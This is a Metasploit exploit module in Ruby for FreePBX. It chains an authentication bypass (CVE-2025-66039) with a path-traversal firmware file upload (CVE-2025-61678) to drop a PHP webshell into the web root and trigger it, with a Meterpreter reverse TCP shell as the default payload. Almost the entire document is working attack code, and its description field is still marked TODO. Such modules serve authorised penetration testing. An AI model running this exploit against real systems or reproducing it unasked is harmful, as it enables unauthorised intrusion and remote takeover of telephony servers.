##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

  include Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FreePBX firmware file upload',
        'Description' => %q{
          TODO
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Noah King', # research
          'msutovsky-r7' # module
        ],
        'References' => [
          [ 'CVE', '2025-66039'], # Authentication Bypass
          [ 'CVE', '2025-61678']  # File Upload and Path Traversal
        ],
        'Platform' => ['php'],
        'Targets' => [
          # Target 0: Windows All
          [
            'PHP',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP,
              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' },
              'Type' => :php
            }
          ]
        ],
        'DisclosureDate' => '2025-12-11',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'The valid FreePBX user', 'admin']),
      ]
    )
  end

  def get_referer
    protocol = ssl ? 'https' : 'http'

    return "#{protocol}://#{datastore['rhosts']}" if rport == 80

    "#{protocol}://#{datastore['rhosts']}:#{datastore['rport']}"
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri('admin', 'config.php'),
      'method' => 'GET'
    })

    return CheckCode::Safe('Webserver authorization mode is not set') unless res&.code == 401 || res.code == 500

    CheckCode::Detected('The FreePBX with authentication bypass detected')
  end

  def get_session_cookie
    res = send_request_cgi({
      'uri' => normalize_uri('admin', 'config.php'),
      'method' => 'GET',
      'headers' => { 'Authorization' => basic_auth(datastore['USERNAME'], Rex::Text.rand_text_alphanumeric(6)) },
      'keep_cookies' => true
    })

    fail_with(Failure::UnexpectedReply, 'Received unexpected reply') unless res&.code == 401

    fail_with(Failure::NotVulnerable, 'Target might not be vulnerable to authentication bypass') unless res.get_cookies
  end

  def upload_webshell
    @target_payload = %(#{Rex::Text.rand_text_alphanumeric(4).downcase}.php)
    @target_dir = Rex::Text.rand_text_alphanumeric(8).downcase

    form_data = Rex::MIME::Message.new

    form_data.add_part(SecureRandom.uuid, nil, nil, 'form-data; name="dzuuid"')
    form_data.add_part('0', nil, nil, 'form-data; name="dzchunkindex"')
    form_data.add_part(payload.encoded.length.to_s, nil, nil, 'form-data; name="dztotalfilesize"')
    form_data.add_part('2000000', nil, nil, 'form-data; name="dzchunksize"')
    form_data.add_part('1', nil, nil, 'form-data; name="dztotalchunkcount"')
    form_data.add_part('0', nil, nil, 'form-data; name="dzchunkbyteoffset"')
    form_data.add_part("../../../var/www/html/#{@target_dir}", nil, nil, 'form-data; name="fwbrand"')
    form_data.add_part('1', nil, nil, 'form-data; name="fwmodel"')
    form_data.add_part('1', nil, nil, 'form-data; name="fwversion"')
    form_data.add_part(payload.encoded, 'application/octet-stream', nil, %(form-data; name="file"; filename="#{@target_payload}"))

    res = send_request_cgi({
      'uri' => normalize_uri('admin', 'ajax.php'),
      'method' => 'POST',
      'headers' => { 'Authorization' => basic_auth(Rex::Text.rand_text_alphanumeric(6), Rex::Text.rand_text_alphanumeric(6)), 'Referer' => "#{get_referer}/admin/config.php?display=endpoint&view=custfwupgrade" },
      'ctype' => "multipart/form-data; boundary=#{form_data.bound}",
      'vars_get' => { 'module' => 'endpoint', 'command' => 'upload_cust_fw' },
      'data' => form_data.to_s
    })

    fail_with(Failure::PayloadFailed, 'Failed to upload webshell') unless res&.code == 500
  end

  def trigger_payload
    send_request_cgi({
      'uri' => normalize_uri(@target_dir, @target_payload),
      'method' => 'GET'
    })
    register_file_for_cleanup(@target_payload)
  end

  def exploit
    print_status('Trying to bypass authentication')
    get_session_cookie

    print_good('Bypass successful, trying upload webshell')

    upload_webshell

    print_good('Upload successful, triggering..')

    trigger_payload
  end
end
